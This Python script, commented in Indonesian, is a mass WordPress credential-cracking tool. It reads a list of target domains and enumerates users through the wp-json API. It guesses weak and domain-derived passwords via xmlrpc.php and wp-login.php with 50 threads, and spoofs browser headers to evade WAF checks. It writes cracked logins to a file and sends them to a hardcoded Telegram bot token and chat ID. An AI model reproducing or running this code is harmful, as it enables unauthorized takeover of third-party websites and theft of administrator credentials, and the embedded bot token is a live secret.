import requests
import concurrent.futures
import urllib3
import sys
import random
from datetime import datetime
from requests.adapters import HTTPAdapter

# Matikan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI UTAMA ---
INPUT_FILE = 'list_domain.txt'
OUTPUT_FILE = 'pwned_results.txt'
THREADS = 50           
TIMEOUT = (6, 12)      # (Connect, Read) - Mencegah stuck
MAX_PASSWORDS = 50     

# --- KONFIGURASI TELEGRAM ---
TELEGRAM_TOKEN = "7994121895:AAEAr83U4UreqI7f0qsyFPzBUOkYOFaCvVY"
TELEGRAM_CHAT_ID = "6602672328"

IGNORED_SUBDOMAINS = ['cpanel', 'webmail', 'whm', 'webdisk', 'autodiscover', 'cpcalendars']

class Col:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    GREY = '\033[90m'
    RESET = '\033[0m'
    BLUE = '\033[94m'

def send_telegram_alert(domain, user, password_info, method):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID: return
    try:
        msg = (f"🔥 *WP CRACKED ({method})* 🔥\nTarget: `{domain}`\nUser: `{user}`\nPass: `{password_info}`")
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=8)
    except: pass

def log(msg, status="INFO"):
    now = datetime.now().strftime("%H:%M:%S")
    colors = {
        "SUCCESS": Col.GREEN, "INFO": Col.CYAN, "FOUND": Col.BLUE,
        "SKIP": Col.GREY, "FAIL": Col.RED, "LOGIN": Col.YELLOW
    }
    print(f"{colors.get(status, Col.RESET)}[{status}] [{now}] {msg}{Col.RESET}")

def get_passwords(user, domain_raw):
    clean = domain_raw.replace("http://", "").replace("https://", "").strip("/")
    domain_full = clean.split('/')[0]      # maytinhthienlinh.com
    domain_name = domain_full.split('.')[0] # maytinhthienlinh
    slug = user.lower()
    
    prio = [
        slug, f"{slug}123", f"{slug}@123", "admin", "admin123", "pass", "password",
        "123456", "12345678", 
        domain_name, f"{domain_name}123", f"{domain_name}12345",
        domain_full  # <--- Password yang Anda maksud ada di sini
    ]
    return list(dict.fromkeys(prio))

# --- MODUL WP-LOGIN (BROWSER SIMULATION) ---
def attack_via_wp_login(session, domain_clean, proto, users, base_headers):
    login_url = f"{proto}{domain_clean}/wp-login.php"
    admin_url = f"{proto}{domain_clean}/wp-admin/"
    
    log(f"Simulating Browser -> {domain_clean}", "LOGIN")

    # 1. STEP WAJIB: KUNJUNGI HALAMAN DULU (GET) UNTUK DAPAT COOKIE
    # Banyak WP menolak login jika tidak ada cookie sesi awal
    try:
        init_resp = session.get(login_url, headers=base_headers, timeout=TIMEOUT, verify=False)
        # Update headers dengan Referer (PENTING UNTUK BYPASS SECURITY)
        post_headers = base_headers.copy()
        post_headers['Referer'] = login_url
        post_headers['Origin'] = f"{proto}{domain_clean}"
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
    except:
        log(f"Connection Failed -> {domain_clean}", "FAIL")
        return False

    found = False
    for user in users:
        if found: break
        passwords = get_passwords(user, domain_clean)
        
        for pwd in passwords:
            try:
                # Payload lengkap seperti browser asli
                data = {
                    'log': user,
                    'pwd': pwd,
                    'wp-submit': 'Log In',
                    'redirect_to': admin_url,
                    'testcookie': '1'
                }
                
                resp = session.post(login_url, data=data, headers=post_headers, timeout=TIMEOUT, verify=False, allow_redirects=False)
                
                # Cek Indikator Sukses
                # 1. Redirect 302
                # 2. Cookie wordpress_logged_in
                if resp.status_code == 302 or 'wordpress_logged_in' in str(resp.cookies) or 'wordpress_logged_in' in str(resp.headers):
                    # Validasi redirect location agar tidak false positive (redirect balik ke login=failed)
                    loc = resp.headers.get('Location', '')
                    if "wp-login.php" in loc and "error" in loc:
                        continue 
                    
                    log(f"CRACKED: {login_url} | User: {user} | Pass: {pwd}", "SUCCESS")
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(f"{login_url}|{user}|{pwd}\n")
                    send_telegram_alert(login_url, user, pwd, "WP-LOGIN")
                    return True
                
                # Debug khusus untuk melihat kenapa gagal (Optional, bisa dihapus)
                # elif "maytinhthienlinh" in domain_clean and pwd == "maytinhthienlinh.com":
                #    print(f"[DEBUG] Failed {domain_clean}. Code: {resp.status_code}. Text len: {len(resp.text)}")

            except Exception:
                continue 
    
    return False

# --- ENGINE UTAMA ---
def attack_domain(domain_raw):
    domain_raw = domain_raw.strip()
    if not domain_raw or "." not in domain_raw: return

    raw_clean = domain_raw.replace('http://', '').replace('https://', '').strip('/')
    for sub in IGNORED_SUBDOMAINS:
        if raw_clean.startswith(f"{sub}."): return

    session = requests.Session()
    # Adapter stabil
    adapter = HTTPAdapter(max_retries=1, pool_connections=THREADS+10, pool_maxsize=THREADS+10)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # User Agent Chrome Asli
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1'
    }

    target_xmlrpc = None
    target_users = ['admin', 'administrator'] 
    detected_proto = 'https://'
    xmlrpc_alive = False

    # 1. CEK XMLRPC (PROBE)
    # Kita coba XMLRPC dulu karena lebih cepat. Kalau gagal baru login manual.
    for proto in ['https://', 'http://']:
        url = f"{proto}{raw_clean}/xmlrpc.php"
        try:
            probe_payload = (f"<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
                             f"<param><value><string>admin</string></value></param>"
                             f"<param><value><string>wrong_pass_test</string></value></param>"
                             f"</params></methodCall>")
            # Timeout pendek untuk probe
            r = session.post(url, data=probe_payload, headers=headers, timeout=(5, 8), verify=False)
            
            if "faultString" in r.text or "isAdmin" in r.text or "blogName" in r.text:
                target_xmlrpc = url
                detected_proto = proto
                xmlrpc_alive = True
                
                # Ambil User JSON
                try:
                    rj = session.get(f"{proto}{raw_clean}/wp-json/wp/v2/users", headers=headers, timeout=(5, 5), verify=False)
                    if rj.status_code == 200:
                        json_users = [u['slug'] for u in rj.json() if 'slug' in u]
                        if json_users: target_users = json_users
                except: pass
                break
        except: continue

    # 2. EKSEKUSI (XMLRPC atau WP-LOGIN)
    success = False
    
    if xmlrpc_alive:
        log(f"Target (XMLRPC): {raw_clean} | Users: {len(target_users)}", "INFO")
        for user in target_users:
            if success: break
            passwords = get_passwords(user, raw_clean)
            for pwd in passwords:
                safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                payload = (f"<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
                           f"<param><value><string>{user}</string></value></param>"
                           f"<param><value><string>{safe_pass}</string></value></param>"
                           f"</params></methodCall>")
                try:
                    resp = session.post(target_xmlrpc, data=payload, headers=headers, timeout=TIMEOUT, verify=False)
                    if "isAdmin" in resp.text or "blogName" in resp.text:
                        log(f"CRACKED: {target_xmlrpc} | User: {user} | Pass: {pwd}", "SUCCESS")
                        with open(OUTPUT_FILE, 'a') as f:
                            f.write(f"{target_xmlrpc}|{user}|{pwd}\n")
                        send_telegram_alert(target_xmlrpc, user, pwd, "XMLRPC")
                        success = True
                        break
                    elif resp.status_code in [403, 503]: break
                except: continue
    
    # JIKA XMLRPC GAGAL/MATI -> PINDAH KE WP-LOGIN (HYBRID)
    if not success:
        # Re-check user via JSON jika belum dapat
        if not xmlrpc_alive:
            try:
                for proto in ['https://', 'http://']:
                    rj = session.get(f"{proto}{raw_clean}/wp-json/wp/v2/users", headers=headers, timeout=(5, 5), verify=False)
                    if rj.status_code == 200:
                        json_users = [u['slug'] for u in rj.json() if 'slug' in u]
                        if json_users: 
                            target_users = json_users
                            detected_proto = proto
                            break
            except: pass
        
        # Jalankan serangan Browser Simulation
        result = attack_via_wp_login(session, raw_clean, detected_proto, target_users, headers)
        if not result:
            log(f"Failed -> {raw_clean}", "FAIL")

def main():
    print(f"{Col.CYAN}--- WP GENIUS (Browser Simulation) ---{Col.RESET}")
    print(f"Logic: Cookies + Referer Headers (Bypass WAF/Security)")
    
    try:
        with open(INPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            domains = list(set([l.strip() for l in f if "." in l]))
    except: return

    random.shuffle(domains)
    print(f"Loaded: {len(domains)} targets")
    print("-" * 50)

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(attack_domain, domain) for domain in domains]
        concurrent.futures.wait(futures)

    print("\n[DONE]")

if __name__ == "__main__":
    main()
